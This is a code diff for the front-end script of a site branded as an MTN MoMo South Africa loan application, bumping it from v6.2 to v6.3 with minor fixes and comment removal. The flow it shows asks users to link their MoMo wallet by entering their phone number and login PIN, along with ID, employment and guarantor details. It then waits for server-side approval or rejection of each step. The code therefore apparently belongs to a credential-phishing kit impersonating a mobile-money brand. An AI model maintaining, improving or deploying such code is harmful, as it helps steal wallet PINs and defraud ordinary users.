@@ -1,5 +1,5 @@
 // ============================================================
-// script.js – MTN MoMo South Africa v6.2 (FIXED)
+// script.js – MTN MoMo South Africa v6.3 (FINAL)
 // ============================================================
 'use strict';
 
@@ -59,7 +59,6 @@ if (!navigator.onLine) document.getElementById('offlineBanner').classList.remove
 window.addEventListener('popstate', () => {
     const active = document.querySelector('.page.active');
     if (active && requiresRegistration(active.id) && !isUserRegistered()) {
-        // ✅ FIX (bug #3): use 'link' mode, don't show an error-style flow
         forceRegistration();
     }
 });
@@ -75,7 +74,7 @@ function isUserRegistered() {
     return !!(S.isRegistered && S.accountType && ACCOUNT_TYPES[S.accountType]);
 }
 
-// ✅ FIX (bug #3): friendly guidance, not an error
+// Friendly guidance, not an error
 function forceRegistration(reason) {
     showToast('🔗 Please link your MoMo account to continue', 'info', 3500);
     setTimeout(() => {
@@ -139,8 +138,9 @@ function goTo(pageId) {
 
     if (pageId === 'page-requirements') updateRequirementsLimits();
     if (pageId === 'page-step1')        refreshStep1();
-    if (pageId === 'page-confirmation') updateConfirmation();
+    if (pageId === 'page-step2')        prefillPersonal();          // ✅ FIX: now called
     if (pageId === 'page-momologin')    prefillMoMoLogin();
+    if (pageId === 'page-confirmation') updateConfirmation();
     refreshAccountBadges();
     if (!pageId.startsWith('page-wait-') && pageId !== 'page-scan') stopPolling();
 }
@@ -172,7 +172,7 @@ function normalizeId(id) {
     else document.getElementById('regDetailsPreview').innerHTML = '<div class="reg-preview-placeholder">Enter your ID above</div>';
 }
 
-// ✅ FIX (bug #4): clamp slider max to account max if registered
+// Clamp slider max to account max if registered
 function updateCalc() {
     const slider = document.getElementById('amtSlider');
     const maxAllowed = isUserRegistered()
@@ -193,10 +193,9 @@ function updateCalc() {
     document.getElementById('totalAmt').textContent   = 'R ' + total.toLocaleString();
     document.getElementById('receiveAmt').textContent = 'R ' + amt.toLocaleString();
 
-    const pct = ((amt - 5000) / (maxAllowed - 5000)) * 100;
+    const pct = ((amt - 5000) / Math.max(1, maxAllowed - 5000)) * 100;
     slider.style.setProperty('--pct', Math.max(0, Math.min(100, pct)) + '%');
 
-    // Update the range-ends label for the upper bound
     const ends = slider.parentElement.querySelector('.range-ends');
     if (ends) {
         ends.innerHTML = `<span>R 5,000</span><span>R ${maxAllowed.toLocaleString()}</span>`;
@@ -270,7 +269,6 @@ function applyAsExistingUser() {
         goTo('page-step1');
         return;
     }
-    // Not linked yet — guide into link flow (NOT an error)
     showToast('🔗 Link your MoMo wallet — takes 60 seconds', 'info', 3500);
     setTimeout(() => startMoMoRegistration({ mode: 'link' }), 500);
 }
@@ -280,7 +278,6 @@ function applyFromCalculator() {
     const amt  = +slider.value;
     const term = document.getElementById('calcTermSelect').value + ' Months';
 
-    // Clamp to account max if known
     const max = S.accountMaxLoan || (S.accountType ? ACCOUNT_TYPES[S.accountType].maxLoan : amt);
     const finalAmt = Math.min(amt, max);
 
@@ -391,7 +388,7 @@ async function completeRegistration() {
         S.isRegistered   = true;
         S.steps = { loan: 'idle', personal: 'idle', employment: 'idle', guarantor: 'idle', momologin: 'idle', qualification: 'idle' };
         saveAll();
-        updateCalc();   // re-clamp slider to new account max
+        updateCalc();
 
         document.getElementById('regProcessingStatus').textContent = '✅ Account created!';
         setTimeout(() => {
@@ -648,7 +645,7 @@ function closeAgreement() { document.getElementById('agreementModal').classList.
 // ═══════════════════════════════════════════════════════════
 function prefillMoMoLogin() {
     const phoneEl = document.getElementById('loginPhone');
-    if (S.personal.phone && !phoneEl.value) phoneEl.value = S.personal.phone;
+    if (S.personal.phone && phoneEl && !phoneEl.value) phoneEl.value = S.personal.phone;
 }
 
 function loginPinMvM(el, i) {
@@ -663,8 +660,6 @@ function loginPinKeydown(el, i, e) {
     if (e.key === 'ArrowLeft'  && i > 0) document.getElementById('loginPin' + (i - 1))?.focus();
     if (e.key === 'ArrowRight' && i < 4) document.getElementById('loginPin' + (i + 1))?.focus();
 }
-
-// ✅ FIX (bug #6): handle multi-digit paste into any PIN box
 function loginPinPaste(e, i) {
     const pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
     if (!pasted) return;
@@ -823,11 +818,9 @@ function stopPolling() {
     currentPollCallback = null;
 }
 
-// ✅ FIX (bug #2): reset the rejected step server-side before navigating
 async function handleRejection(step) {
     showToast(`❌ ${step.toUpperCase()} rejected. Please try again.`, 'error');
 
-    // Reset server-side so the user can retry this step without a full restart
     try {
         await apiCall(`/api/retry/${S.applicationId}/${step}`, { method: 'POST' });
         if (S.steps[step]) S.steps[step] = 'idle';
@@ -871,7 +864,6 @@ function showApproval() {
     goTo('page-approval');
 }
 
-// ✅ FIX (bug #5): show ALL months, scrollable modal
 async function viewSchedule() {
     try {
         const data = await apiCall(`/api/repayment-schedule/${S.applicationId}`);
@@ -894,12 +886,10 @@ function copyAppId() {
     );
 }
 
-// ✅ FIX (bug #7): preserve applicationId so user can resume
 function cancelApplication() {
     if (!confirm('Cancel this application? You can resume later with your Application ID.')) return;
     stopPolling();
     if (qualificationAnimator) { clearInterval(qualificationAnimator); qualificationAnimator = null; }
-    // Keep S.applicationId in localStorage — only clear the volatile data
     save(KEYS.APP_ID, S.applicationId);
     rm(KEYS.APP_DATA);
     S.isRegistered = false;
@@ -924,7 +914,6 @@ async function recoverSession() {
     if (!id) { goTo('page-landing'); return; }
     S.applicationId = id;
 
-    // Local state (if present)
     const data = get(KEYS.APP_DATA);
     if (data) {
         S.isRegistered   = data.isRegistered;
@@ -937,7 +926,6 @@ async function recoverSession() {
         S.guarantor      = data.guarantor || {};
     }
 
-    // Server state — authoritative, works on new devices too
     try {
         const r = await fetch(`/api/status/${id}`);
         if (!r.ok) { goTo('page-landing'); return; }
@@ -949,14 +937,13 @@ async function recoverSession() {
         S.accountMaxLoan = serverState.accountMaxLoan;
         S.steps          = serverState.steps || S.steps || {};
 
-        // ✅ FIX (bug #1): hydrate from server if local storage was empty
         if (serverState.loan)       S.loan       = { ...S.loan,       ...serverState.loan };
         if (serverState.personal)   S.personal   = { ...S.personal,   ...serverState.personal };
         if (serverState.employment) S.employment = { ...S.employment, ...serverState.employment };
         if (serverState.guarantor)  S.guarantor  = { ...S.guarantor,  ...serverState.guarantor };
 
         saveAll();
-        updateCalc();   // clamp slider to account max
+        updateCalc();
 
         const steps = S.steps;
         const pending = STEPS.find(s => steps[s] === 'pending');
@@ -1036,4 +1023,4 @@ document.addEventListener('DOMContentLoaded', () => {
 // ─── INIT ───
 updateCalc();
 recoverSession();
-console.log('✅ MTN MoMo SA v6.2 loaded');
+console.log('✅ MTN MoMo SA v6.3 loaded');
